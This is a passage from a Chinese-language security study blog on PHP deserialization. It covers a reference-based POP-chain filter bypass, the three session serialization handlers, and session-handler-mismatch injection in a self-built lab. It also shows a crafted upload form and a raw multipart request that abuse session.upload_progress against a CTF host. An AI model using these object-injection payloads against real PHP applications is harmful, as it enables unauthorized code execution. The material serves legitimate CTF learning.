class="line"><span class="comment">//if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;no&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$xk</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$xk</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b = &amp;<span class="variable">$b</span>-&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;s:1:&quot;c&quot;;N;s:1:&quot;b&quot;;R:4;&#125;</span><br></pre></td></tr></table></figure>



<p>也可以想其他办法将R后的数字改了 </p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416322cc32c.png" alt="image-20240227200401573"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630f30a95.png" alt="image-20240227200430070"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d00d0f.png" alt="image-20240227200441675"></p>
<p>构造</p>
<p><code>$a-&gt;enter=&amp;$a-&gt;secret</code></p>
<p>使enter的值随secret变化而变化</p>
<p>secret再取enter的值 就一样了</p>
<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>当session_start()被调用或者php.ini中的session.auto_star为1时，php内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163221be00.png" alt="image-20240227201906897"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630fc978e.png" alt="image-20240228235355463"></p>
<p>赋值123456</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d5dc96.png" alt="image-20240228235539736"></p>
<p>键名+竖线+经过serialize()函数处理过的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631aa6be4.png" alt="image-20240228235926447"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416314a59c3.png" alt="image-20240229000033551"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416320af6ba.png" alt="image-20240229000223635"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e8d329.png" alt="image-20240229000546732"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632427238.png" alt="image-20240229003011924"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0ef1700e.png" alt="image-20240229003051944"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632425d21.png" alt="image-20240229003121533"></p>
<p>例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416314b7419.png" alt="image-20240303175045112"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e82d6a.png" alt="image-20240303175336453"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416319738fb.png" alt="image-20240303175451812"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0edb6163.png" alt="image-20240303175554019"></p>
<p><strong>补：</strong></p>
<h3 id="php-session理解"><a href="#php-session理解" class="headerlink" title="php session理解"></a>php session理解</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>session:</p>
<p>Session一般称为“<strong>会话控制</strong>”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
<p>php session:</p>
<p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
<p>php session工作流程:</p>
<p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;xianzhi&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631496d22.png" alt="image-20240502143605251"></p>
<p>php session在php.ini中的配置</p>
<p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>

<ul>
<li>session.save_handler&#x3D;””</li>
</ul>
<p> <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
<ul>
<li><strong>session.serialize_handler</strong></li>
</ul>
<p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
<h3 id="处理器与利用"><a href="#处理器与利用" class="headerlink" title="处理器与利用"></a>处理器与利用</h3><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ee6818.png" alt="image-20240502143933690"></p>
<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
<p>并且文件的内容始终是session值的序列化之后的内容。</p>
<h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br></pre></td></tr></table></figure>



<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，如果存在就是用这个session_id，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
<ul>
<li><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</li>
<li><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a target="_blank" rel="noopener" href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
<h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
<p>上述三种处理器中，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<p>测试一下，demo如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="php处理器-1"><a href="#php处理器-1" class="headerlink" title="php处理器"></a>php处理器</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630dc052d.png" alt="image-20240502144559398"></p>
<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
<h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416315d796a.png" alt="image-20240502145305649"></p>
<p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
<p>demo改为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionseesionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e504d7.png" alt="image-20240502145320585"></p>
<p>两张图片可以对比一下</p>
<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ca56b9.png" alt="image-20240502145401992"></p>
<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
<p><strong>注意：</strong></p>
<p>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少</p>
<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
<h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>demo如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ca5660.png" alt="image-20240502145746648"></p>
<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="自建环境模拟"><a href="#自建环境模拟" class="headerlink" title="自建环境模拟"></a>自建环境模拟</h4><p>建造一个环境，有两个文件，分别如下：</p>
<p>flag.php：</p>
<p>这个页面用于接受session的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.php：</p>
<p>这个页面用于测试反序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先访问1.php，输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630f99e53.png" alt="image-20240502145916097"></p>
<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e91508.png" alt="image-20240502145939815"></p>
<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e51444.png" alt="image-20240502150059478"></p>
<p>此时的session:</p>
<p><code>a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</code></p>
<p>这里可以看到成功写入，这是再访问以下1.php</p>
<p>成功反序列化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d61924.png" alt="image-20240502150217878"></p>
<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
<ul>
<li>两个文件session引擎配置不同</li>
<li>其中一个session可控</li>
<li>两个文件同域</li>
</ul>
<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
<h4 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h4><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
<p>条件：</p>
<ol>
<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
</ol>
<p>这两个都是可在查的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e9ead5.png" alt="image-20240502150413937"></p>
<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload</p>
<p><strong>对session上传进度说明一下：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416314eb260.png" alt="image-20240502150438892"></p>
<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>

<p>第一个就是上述官方改法，还有一个是在<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
